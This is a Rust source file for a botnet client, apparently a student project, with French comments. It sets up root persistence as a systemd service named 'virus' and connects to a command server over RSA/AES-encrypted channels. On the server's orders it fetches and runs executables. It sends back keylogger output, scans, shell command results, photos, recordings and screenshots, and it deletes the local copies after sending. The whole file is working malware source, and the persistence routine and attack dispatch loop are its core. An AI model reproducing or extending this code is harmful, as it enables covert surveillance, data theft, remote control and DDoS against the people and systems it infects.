mod connexion;

// use std::borrow::Borrow;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::str;

// Handshake
use rsa::{RsaPublicKey, RsaPrivateKey, Pkcs1v15Encrypt};
use rsa::pkcs8::{EncodePublicKey, LineEnding};
use rand::rngs::OsRng;
use serde_json;


use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use serde::{Deserialize, Serialize};
use generic_array::GenericArray;
use base64::{Engine as _, engine::general_purpose};
use std::fs::{self, File};
use std::path::{Path, PathBuf};

type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

use std::process::{Command};
use std::time::Duration;
use std::thread;

use std::io::prelude::*;
use base64::prelude::*;


#[cfg(client_os = "linux")]
use std::os::unix::fs::PermissionsExt;

// JSON config handshake
#[derive(Serialize, Deserialize)]
struct HandshakeConfJson {
    action: String,
    b64symetric: String,
    b64iv: String,
    multithread: bool,
    stealth: bool,
}

// JSON attack
#[derive(Serialize, Deserialize)]
pub struct DataReceived {
    pub(crate) id: String,
    pub(crate) attack: String,
    pub(crate) arg1:String,
    pub(crate) arg2:String,
    pub(crate) arg3:String
}

pub(crate) fn json_to_struct_attack(data: String) -> Result<DataReceived, serde_json::Error> {
    match serde_json::from_str::<DataReceived>(&data) {
        Ok(data) => Ok(data),
        Err(err) => {
            eprintln!("Error parsing JSON data: {:?}", err);
            Err(err)
        }
    }
}

fn json_to_struct_handshake_stc(data: String) -> HandshakeConfJson {
    serde_json::from_str::<HandshakeConfJson>(&data).expect("Erreur JSON")
}

fn struct_to_json_handshake_stc(data: HandshakeConfJson) -> String {
    serde_json::to_string(&data).unwrap()
}



// Send data to server as bytes vector to the server
fn send_encrypted_data_to_server(
    mut stream: &TcpStream,
    data: Vec<u8>,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
) {
    // Chiffrement de la donnée à envoyer
    let mut data_buffer = vec![0u8; data.len() + 16]; // Adjust buffer size
    let encrypted_data = Aes128CbcEnc::new(&symetric_key, &iv)
        .encrypt_padded_b2b_mut::<Pkcs7>(&data, &mut data_buffer)
        .unwrap();

    let mut size_buffer = vec![0u8; 16];// Adjust buffer size
    let encrypted_data_size = Aes128CbcEnc::new(&symetric_key, &iv)
        .encrypt_padded_b2b_mut::<Pkcs7>(&encrypted_data.len().to_string().as_bytes(), &mut size_buffer)
        .unwrap();

    // Envoi de la taille de la donnée chéffrée
    match stream.write_all(encrypted_data_size) {
        Ok(_) => {
            println!("[+] Data size sent successfully!");
        }
        Err(err) => {
            eprintln!("[!] Error sending data size: {:?}", err);
        }
    }

    // Envoi de la donnée chiffrée
    match stream.write_all(encrypted_data) {
        Ok(_) => {
            println!("[+] Data sent successfully!");
        }
        Err(err) => {
            eprintln!("[!] Error sending data size: {:?}", err);
        }
    }
}


// Send string to server
fn send_encrypted_string_to_server(
    stream: &TcpStream,
    data: String,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
) {
    let data_as_bytes = data.as_bytes().to_vec();
    send_encrypted_data_to_server(stream, data_as_bytes, symetric_key, iv)
}


// Receive encrypted data from server
fn receive_encrypted_data_from_server(
    mut stream: &TcpStream,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
)-> Result<Vec<u8>, ()>{

    // Lecture de la taille de la donnée à receptionner
    let mut enc_size_buffer = [0; 16];
    match stream.read_exact(&mut enc_size_buffer) {
        Ok(()) => {
            println!("[+] Data size received successfully!");
        }
        Err(err) => {
            eprintln!("Erreur lors de la lecture: {}", err);
        }
    }

    let data_size;
    let mut size_buffer = vec![0u8; 16];
    match Aes128CbcDec::new(&symetric_key, &iv).decrypt_padded_b2b_mut::<Pkcs7>(&enc_size_buffer, &mut size_buffer) {
        Ok(size_as_string) => {
            data_size = str::from_utf8(&size_as_string).unwrap().parse::<usize>().unwrap()
        }
        Err(err) => {
            eprintln!("Error decrypting data: {:?}", err);
            data_size = 0;
        }
    }

    println!("Data size to receive : {}", data_size);


    // Reception de la donnée chiffrée
    let mut enc_data_buffer = vec![0u8; data_size];
    match stream.read_exact(&mut enc_data_buffer) {
        Ok(()) => {
            println!("[+] Data received successfully!");
        }
        Err(err) => {
            eprintln!("Erreur lors de la lecture: {}", err);
        }
    }

    let mut data_buffer = vec![0u8; data_size];
    match Aes128CbcDec::new(&symetric_key, &iv).decrypt_padded_b2b_mut::<Pkcs7>(&enc_data_buffer, &mut data_buffer) {
        Ok(data) => { 
            
            return Ok(data.to_vec())
        }
        Err(err) => {
            eprintln!("Error decrypting data: {:?}", err);
            Err(())
        }
    }
}


// Receive encrypted string from the server
fn receive_encrypted_string_from_server(
    stream: &TcpStream,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
) -> String{
    
    match receive_encrypted_data_from_server(stream, symetric_key, iv){
        Ok(data) => {
            match str::from_utf8(&data) {
                Ok(utf8_data) => utf8_data.to_string(),
                Err(err) => {
                    eprintln!("Error converting data to UTF-8: {:?}", err);
                    "".to_string()
                }
            }
        },
        Err(_) => {
            eprintln!("Error receiving data from server");
            "".to_string()
        }
    }

   
}

fn receive_encrypted_file_from_server(
    mut stream: TcpStream,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    size_expected: usize,
) -> Result<Vec<u8>, String> {

    stream.set_read_timeout(Some(Duration::new(60, 0)));

    let mut buffer = vec![0u8; size_expected];
    let mut data = Vec::new();

    println!("[+] start receiving file from server");
    
    match stream.read_exact(&mut buffer) {
        Ok(()) => {
            println!("[+] start receiving file from server");
            data.extend_from_slice(&buffer[..size_expected]);
        }
        Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
            // WouldBlock means no data available right now, continue looping
            return Err(e.to_string());
        }
        Err(e) => {
            println!("[!] Error reading file from server: {:?}", e);
            return Err(e.to_string());
        }
    }

    if data.len() != size_expected{
        println!("[!] Error reading file from server (taille de fichier reçu diffente de celle attendue)");
        // renvoyer une erreur
        return Err("Error".to_string())
    }
    
    

    println!("[+] file received from server");
    // let mut buffer = vec![0u8; data.len() + 16];
    match Aes128CbcDec::new(&symetric_key, &iv).decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buffer){
        Ok(decrypted_data) => { 
            Ok(decrypted_data.to_vec())
        }

        Err(err) => {
            eprintln!("Error decrypting data: {:?}", err);
            Err("Error while decrying data".to_string())
        }
    }
}



fn check_and_request_executable(
                                    executable_name: &str,
                                    executable_dir: &str,
                                    symetric_key: &GenericArray<u8, typenum::consts::U16>,
                                    iv: &GenericArray<u8, typenum::consts::U16>,
                                    stream: &TcpStream
                                    ) -> io::Result<()> {

    #[cfg(client_os = "windows")]
    let executable_path = Path::new(executable_dir).join(executable_name).with_extension("exe");

    #[cfg(client_os = "linux")]
    let executable_path = Path::new(executable_dir).join(executable_name);
    
    println!("\t[?] Checking if executable exists at {:?}", executable_path);

    if !executable_path.exists() {
        println!("\t[!] Executable not found, requesting from server...");

        loop{
            // Envoi du json de requete pour l'executable
            let request_message = format!("{{\"request\":\"{}\"}}", executable_name);
            send_encrypted_string_to_server(&stream, request_message, symetric_key.clone(), iv.clone());
            println!("\t\t[+] Request sent");


            // Attente de l'envoi du fichier
            println!("\t\t[+] waiting for file data");
            match receive_encrypted_data_from_server(&stream, symetric_key.clone(), iv.clone()){
                Ok(data_file) => {
                    println!("\t\t[+] file data received");
                    
                    let mut file = File::create(&executable_path)?;
                    file.write_all(&data_file)?;

                    #[cfg(client_os = "linux")]
                    {
                        let metadata = file.metadata()?;
                        let mut permissions = metadata.permissions();
                        permissions.set_mode(0o755); // rwxr-xr-x
                        fs::set_permissions(&executable_path, permissions)?;
                    }

                    break;

                }
                Err(e) => {
                    println!("\t\t[!] Mauvais fichier recu : {:?}", e);
                }
            }
            // thread::sleep(Duration::new(1, 0));
        }


        println!("\t\t[+] Executable received and stored at {:?}", executable_path);
    } else {
        println!("\t[+] Executable found at {:?}", executable_path);
        // send_encrypted_string_to_server(sender.clone(), "YES".to_string(), symetric_key.clone(), iv.clone());
    }

    Ok(())
}

fn execute_attack(
    attack_name: &str,
    args: &str,
    symetric_key: &GenericArray<u8, typenum::consts::U16>,
    iv: &GenericArray<u8, typenum::consts::U16>,
    stream: &TcpStream,
) ->  io::Result<String> {
    
    let executable_dir: &str;
    let executable_path: PathBuf;

    if cfg!(client_os = "windows"){
        executable_dir = "./actions";
    }else{
        executable_dir = "/etc/actions";
    }
     
    check_and_request_executable(attack_name, executable_dir, symetric_key, iv, stream)?;

    if cfg!(client_os = "windows"){
        executable_path = Path::new(executable_dir).join(attack_name).with_extension("exe");
    }else{
        executable_path = Path::new(executable_dir).join(attack_name);
    }

    // Run the executable with argument `10` and capture the output
    println!("[+] Lancement de l'attaque: {}", attack_name);

    // Split the args string into separate arguments
    let args: Vec<&str> = args.split_whitespace().collect();


    // println!("{:?}", Command::new(&executable_path).args(&args));
    let output = Command::new(&executable_path).args(&args).output()?;
    
    // println!("{:?}", output);
    // Check if the command was successful
    if output.status.success() {
        // Convert stdout to a string
        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        println!("[+] Attaque Exécutée: {}", attack_name);
        Ok(stdout)
    } else {
        // Convert stderr to a string and return an error
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        println!("[+] Attaque Exécutée: {}", attack_name);
        Err(io::Error::new(io::ErrorKind::Other, stderr))
    }

    
}

fn persistence() {

    // récupère le user pwd
    let output = Command::new("pwd")
        .output()
        .expect("Erreur lors de la récupération du nom d'utilisateur");

    println!("{:?}", output);

    let pwd = String::from_utf8_lossy(&output.stdout).trim().to_string();
    let path = format!("{}/PA-BOTNET-CLIENT", pwd);


    // Copie un fichier dans le répertoire de démarrage
    let output = Command::new("cp")
        .arg(path)
        .arg("/etc/")
        .output()
        .expect("Erreur lors de la copie du fichier");

    println!("Fichier copié: {:?}", output);


    let output = Command::new("mv")
        .arg("/etc/PA-BOTNET-CLIENT")
        .arg("/etc/virus")
        .output()   
        .expect("Erreur lors de la copie du fichier");


    // Contenu du fichier de service
    let service_content = r#"[Unit]
    Description=Virus Service in Rust
    After=network.target

    [Service]
    ExecStart=/etc/virus
    Restart=always
    User=root
    Group=nogroup
    Environment=RUST_LOG=info

    [Install]
    WantedBy=multi-user.target
    "#;

    // Écrire le fichier de service
    let service_path = "/etc/systemd/system/virus.service";
    let mut file = match fs::File::create(service_path) {
        Ok(file) => file,
        Err(e) => {
            eprintln!("Erreur lors de la création du fichier: {}", e);
            return;
        },
    };

    if let Err(e) = file.write_all(service_content.as_bytes()) {
        eprintln!("Erreur lors de l'écriture dans le fichier: {}", e);
        return;
    }

    // Recharger systemd pour prendre en compte le nouveau service
    let output = Command::new("systemctl")
        .arg("daemon-reload")
        .output()
        .expect("Erreur lors du rechargement de systemd");
    
    if !output.status.success() {
        eprintln!("Erreur lors du rechargement de systemd: {}", String::from_utf8_lossy(&output.stderr));
        return;
    }

    // Activer le service pour qu'il démarre au démarrage
    let output = Command::new("systemctl")
        .arg("enable")
        .arg("virus")
        .output()
        .expect("Erreur lors de l'activation du service");

    if !output.status.success() {
        eprintln!("Erreur lors de l'activation du service: {}", String::from_utf8_lossy(&output.stderr));
        return;
    }

    // Démarrer le service immédiatement
    let output = Command::new("systemctl")
        .arg("start")
        .arg("virus")
        .output()
        .expect("Erreur lors du démarrage du service");

    if !output.status.success() {
        eprintln!("Erreur lors du démarrage du service: {}", String::from_utf8_lossy(&output.stderr));
        return;
    }

    println!("Service systemd créé et démarré avec succès !");

    //kill le programme
    std::process::exit(0);
}

fn check_service()-> bool{
    let output = Command::new("systemctl")
        .arg("status")
        .arg("virus")
        .output()
        .expect("Erreur lors de la vérification du service");

    if !output.status.success() {
        false
    }else{
        true
    }

}

fn create_action_dir(){

    let path;

    if cfg!(target_os = "windows") {
        path = "./actions";
    } else {
        path = "/etc/actions/";
    }

    println!("[+] Création du dossier actions path: {}", path);
    match fs::create_dir(path){
        Ok(_) => {
            println!("[+] Dossier actions créé");
        }
        Err(e) => {
            println!("[!] Erreur lors de la création du dossier actions: {}", e);
        }
    }
}


fn main() -> io::Result<()> {

    if cfg!(client_os = "linux"){
        // Persistance
        if check_service(){
            println!("[+] Service systemd déjà créé et démarré");
        }else{
            println!("[+] Création du service systemd");
            persistence();
        }
    }

    // Création du dossier actions
    create_action_dir();

    

    let mut connected: bool = false;
    let mut first_connection: bool = true;

    let mut symetric_key = GenericArray::default();
    let mut iv = GenericArray::default();

    let mut stream = connexion::connect(5000)?;


    loop{
        
        if connected == false {
            
            if first_connection == false{
                println!("[!] Trying to reconnect to the server");
                match connexion::connect(5000) {
                    Ok(new_stream) => {
                        stream = new_stream;
                    }
                    Err(_) => {
                        println!("[!] Error while reconnecting to the server");
                        continue;
                    }
                }
            }else{
                first_connection = false
            }
            
                


            // ========== HANDSHAKE ==========
            println!("[+] starting Handshake");
            // Génération de la paire de clés RSA
            let mut rng = OsRng;
            let bits = 2048;
            let private_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
            let public_key = RsaPublicKey::from(&private_key);

            let pkcs1_encoded_public_pem = public_key.to_public_key_pem(LineEnding::LF).unwrap();

            // Envoi de la clé publique au serveur python
            // sender.send(pkcs1_encoded_public_pem.as_bytes().to_vec()).unwrap();
            stream.write_all(pkcs1_encoded_public_pem.as_bytes()).expect("Erreur lors de l'envoi du message");

            // Réception de la clé symétrique chiffrée
            // let encrypted_handshake_data = receiver.recv().unwrap();
            let mut encrypted_handshake_data = [0; 256];

            match stream.read(&mut encrypted_handshake_data) {
                Ok(bytes_read) => {
                    if bytes_read == 0 {
                        // La connexion a été fermée
                        eprintln!("/!\\ La communication a été coupée pendant le handshake /!\\");
                    }
                }
                Err(err) => {
                    eprintln!("Erreur lors de la lecture: {}", err);
                }
            }

            // Déchiffrement de la clé symétrique
            let decrypted_data = private_key.decrypt(Pkcs1v15Encrypt, &encrypted_handshake_data).unwrap();

            let handshake_data = json_to_struct_handshake_stc(str::from_utf8(decrypted_data.as_slice()).unwrap().to_string());

            let _stealth_mode = handshake_data.stealth;
            let _multithread_mode = handshake_data.multithread;

            // Decode the base64 key
            match general_purpose::STANDARD.decode(handshake_data.b64symetric.as_bytes()) {
                Ok(decoded_sym_key) => {
                    symetric_key = GenericArray::clone_from_slice(&decoded_sym_key);
                }
                Err(err) => {
                    eprintln!("Error decoding base64 symetric key: {}", err);
                    symetric_key = GenericArray::default();
                }
            };

            // Decode the base64 iv
            match general_purpose::STANDARD.decode(handshake_data.b64iv.as_bytes()) {
                Ok(decoded_iv) => {
                    iv = GenericArray::clone_from_slice(&decoded_iv);
                }
                Err(err) => {
                    eprintln!("Error decoding base64 iv: {}", err);
                    iv = GenericArray::default();
                }
            };

            #[cfg(client_os = "windows")]
            let os = "windows";

            #[cfg(client_os = "linux")]
            let os = "linux";

            let uid = machine_uid::get().unwrap();

            let handshake_response = format!("{{\"action\":\"client_config\",\"uid\":\"{}\", \"os\":\"{}\"}}", uid, os);

            // Chiffrement de la config du client
            let mut buffer = vec![0u8; 96]; // Adjust buffer size
            let encrypted_data = Aes128CbcEnc::new(&symetric_key, &iv)
                .encrypt_padded_b2b_mut::<Pkcs7>(&handshake_response.as_bytes(), &mut buffer)
                .unwrap();


            // Envoi de la config du client au serveur
            // send_encrypted_string_to_server(sender.clone(), handshake_response, symetric_key.clone(), iv.clone());
            stream.write_all(encrypted_data).expect("Erreur lors de l'envoi du message");
            

            println!("[+] end Handshake");

            connected = true;
        }

        // ========== END HANDSHAKE ==========


        // ========== MAIN LOOP ==========
        if connected == true {
            let stream_clone: TcpStream = stream.try_clone().expect("Error while cloning stream in thread");
            
            let message = receive_encrypted_string_from_server(&stream_clone, symetric_key.clone(), iv);

            println!("Message reçu : {}", message);

            if message != "" {

                if let Ok(json_attack) = json_to_struct_attack(message.clone()) {
                    println!("[?] instruction reçue : {}", json_attack.attack);

                    let id_attack = json_attack.id;
                    let type_attack = json_attack.attack;

                    let args = format!("{} {} {}", &json_attack.arg1, &json_attack.arg2, &json_attack.arg3);

                    match execute_attack(type_attack.clone().as_str(), &args , &symetric_key, &iv, &stream_clone) {
                        Ok(output) => {
                            // si l'attaque ne nécessite pas d'envoyer de fichier
                            if type_attack == "ddos" || type_attack == "autorep"{
                                let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"done\"}}", id_attack, type_attack);
                                send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());


                            // si l'attaque nécessite d'envoyer de la donnée à garder
                            }else if type_attack == "keylogger" || type_attack == "scan" || type_attack == "command"{
                                let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, BASE64_STANDARD.encode(output.as_bytes()));
                                // println!("{:?}", response);
                                send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
                                

                            // si l'attaque nécessite d'envoyer un fichier
                            }else if type_attack == "picture" || type_attack == "record" || type_attack == "screenshot"{
                                // lecture du fichier
                                // println!("{:?}", output);
                                let file_path = output.replace("\n", "");

                                match fs::read(file_path.clone()){
                                    Ok(file_data) => {
                                        let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, BASE64_STANDARD.encode(file_data.as_slice()));
                                        send_encrypted_string_to_server(&stream, response, symetric_key.clone(), iv.clone());

                                        // suppression du fichier
                                        fs::remove_file(file_path).expect("Error while deleting file");
                                    }

                                    Err(e) => {
                                        let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"error\"}}", id_attack, type_attack);
                                        send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
                                        println!("Error reading file: {}", e);
                                    }
                                }
                            }
                        }

                        Err(e) => {
                            let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"error\"}}", id_attack, type_attack);
                            send_encrypted_string_to_server(&stream_clone, response, symetric_key.clone(), iv.clone());
                            println!("Error executing attack: {}", e);
                        }
                    }
                }
            }else{
                println!("[!] Disconnected from server");
                connected = false;
            }
        }
    }

    // Ok(())
}










